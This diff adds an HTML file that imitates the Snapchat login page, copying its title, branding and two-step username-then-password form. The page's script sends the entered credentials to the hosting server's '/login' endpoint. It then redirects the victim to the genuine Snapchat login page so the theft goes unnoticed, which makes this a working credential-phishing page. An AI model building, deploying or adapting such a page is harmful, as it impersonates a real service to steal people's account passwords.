@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Log in to Snapchat</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f0f0f0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 16px;
+    }
+
+    /* Top banner */
+    .open-banner {
+      background: #FFFC00;
+      border-radius: 50px;
+      padding: 12px 24px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 700;
+      font-size: 16px;
+      color: #000;
+      cursor: pointer;
+      margin-bottom: 20px;
+      width: 100%;
+      max-width: 420px;
+      justify-content: center;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      transition: transform 0.1s;
+    }
+    .open-banner:active { transform: scale(0.97); }
+    .open-banner svg { width: 22px; height: 22px; }
+
+    /* Card */
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 36px 28px 28px;
+      width: 100%;
+      max-width: 420px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0;
+    }
+
+    /* Ghost logo */
+    .ghost-logo {
+      width: 64px;
+      height: 64px;
+      margin-bottom: 16px;
+    }
+
+    h1 {
+      font-size: 26px;
+      font-weight: 800;
+      color: #000;
+      margin-bottom: 28px;
+      text-align: center;
+    }
+
+    /* Form */
+    .form-group {
+      width: 100%;
+      margin-bottom: 4px;
+    }
+    label {
+      font-size: 13px;
+      color: #555;
+      display: block;
+      margin-bottom: 6px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1.5px solid #e0e0e0;
+      border-radius: 10px;
+      font-size: 15px;
+      outline: none;
+      color: #000;
+      background: #fafafa;
+      transition: border-color 0.2s;
+    }
+    input:focus { border-color: #0aa3E7; background: #fff; }
+
+    .phone-link {
+      color: #0aa3e7;
+      font-size: 14px;
+      font-weight: 600;
+      text-decoration: none;
+      margin: 12px 0 20px;
+      display: block;
+      text-align: center;
+      cursor: pointer;
+    }
+    .phone-link:hover { text-decoration: underline; }
+
+    .btn-next {
+      width: 100%;
+      padding: 15px;
+      background: #0aa3e7;
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      margin-bottom: 24px;
+    }
+    .btn-next:hover { background: #0891cc; }
+    .btn-next:active { transform: scale(0.98); }
+
+    /* OR divider */
+    .divider {
+      display: flex;
+      align-items: center;
+      width: 100%;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #e0e0e0;
+    }
+    .divider span {
+      font-size: 13px;
+      color: #aaa;
+      font-weight: 600;
+      letter-spacing: 0.05em;
+    }
+
+    /* Google button */
+    .btn-google {
+      width: 100%;
+      padding: 14px;
+      background: #fff;
+      color: #333;
+      border: 1.5px solid #e0e0e0;
+      border-radius: 50px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: background 0.15s, border-color 0.15s;
+    }
+    .btn-google:hover { background: #f5f5f5; border-color: #ccc; }
+    .btn-google img { width: 20px; height: 20px; }
+
+    /* Sign up */
+    .signup-row {
+      margin-top: 28px;
+      font-size: 15px;
+      color: #555;
+      text-align: center;
+    }
+    .signup-row a {
+      color: #000;
+      font-weight: 700;
+      text-decoration: none;
+      margin-left: 6px;
+      cursor: pointer;
+    }
+    .signup-row a:hover { text-decoration: underline; }
+
+    /* Password step (hidden by default) */
+    .password-group { display: none; }
+    .password-group.visible { display: block; }
+
+    .error-msg {
+      color: #e53935;
+      font-size: 13px;
+      margin-top: 6px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+
+
+  <!-- Card -->
+  <div class="card">
+    <!-- Ghost SVG Logo -->
+    <svg class="ghost-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M50 8C31 8 18 21 18 38v28l8-6 8 6 8-6 8 6 8-6 8 6V38C66 21 69 8 50 8z" fill="#000"/>
+      <circle cx="38" cy="36" r="5" fill="#fff"/>
+      <circle cx="62" cy="36" r="5" fill="#fff"/>
+      <circle cx="40" cy="35" r="2.5" fill="#000"/>
+      <circle cx="64" cy="35" r="2.5" fill="#000"/>
+    </svg>
+
+    <h1>Log in to Snapchat</h1>
+
+    <!-- Username field -->
+    <div class="form-group" style="width:100%">
+      <label for="username">Username or email</label>
+      <input type="text" id="username" placeholder="" autocomplete="username"/>
+      <span class="error-msg" id="username-error">Please enter your username or email.</span>
+    </div>
+
+    <!-- Password field (shown after Next) -->
+    <div class="form-group password-group" id="password-group" style="width:100%; margin-top:14px;">
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder=""/>
+      <span class="error-msg" id="password-error">Please enter your password.</span>
+    </div>
+
+    <a class="phone-link" id="phone-link">Use phone number instead</a>
+
+    <button class="btn-next" id="next-btn" onclick="handleNext()">Next</button>
+
+    <div class="divider"><span>OR</span></div>
+
+    <button class="btn-google" onclick="location.href='/auth/google'">
+      <!-- Google G SVG -->
+      <svg width="20" height="20" viewBox="0 0 48 48">
+        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.29-8.16 2.29-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+      </svg>
+      Continue with Google
+    </button>
+  </div>
+
+  <!-- Sign up -->
+  <div class="signup-row">
+    New to Snapchat? <a href="https://www.snapchat.com/download?continue=%2Fv2%2Fwelcome&captchaChallenge=CioKKDZMZk5RV1lyQUFBQUFHQzkwSVc0a3VMaXdMQ3dNS2VhcEh0U1o5V1U&ai=bmFuYWFpc2hhaXNhaG1v">Sign up</a>
+  </div>
+
+  <script>
+let step = 1;
+
+async function handleNext() {
+  const usernameInput = document.getElementById('username');
+  const username = usernameInput.value.trim();
+  const usernameError = document.getElementById('username-error');
+  const passwordGroup = document.getElementById('password-group');
+  const passwordInput = document.getElementById('password');
+  const passwordError = document.getElementById('password-error');
+  const btn = document.getElementById('next-btn');
+  const phoneLink = document.getElementById('phone-link');
+
+  if (step === 1) {
+    if (!username) {
+      usernameError.style.display = 'block';
+      return;
+    }
+    usernameError.style.display = 'none';
+    
+    passwordGroup.classList.add('visible');
+    phoneLink.style.display = 'none';
+    btn.textContent = 'Log in';
+    step = 2;
+  } else {
+    const password = passwordInput.value.trim();
+    if (!password) {
+      passwordError.style.display = 'block';
+      return;
+    }
+    passwordError.style.display = 'none';
+    btn.textContent = 'Logging in...';
+    btn.disabled = true;
+
+    try {
+      const response = await fetch('/login', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username, password })
+      });
+
+      if (response.ok) {
+        usernameInput.value = '';
+        passwordInput.value = '';
+        window.location.href = 'https://accounts.snapchat.com/v2/login';
+      } else {
+        
+        passwordError.textContent = 'Authentication failed. Please try again.';
+        passwordError.style.display = 'block';
+        btn.textContent = 'Log in';
+        btn.disabled = false;
+      }
+    } catch (error) {
+      console.error(error.message);
+      passwordError.textContent = 'Network error. Please check your connection.';
+      passwordError.style.display = 'block';
+      btn.textContent = 'Log in';
+      btn.disabled = false;
+    }
+  }
+}
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Enter' && !btn.disabled) handleNext();
+});
+  
+  </script>
+</body>
+</html>
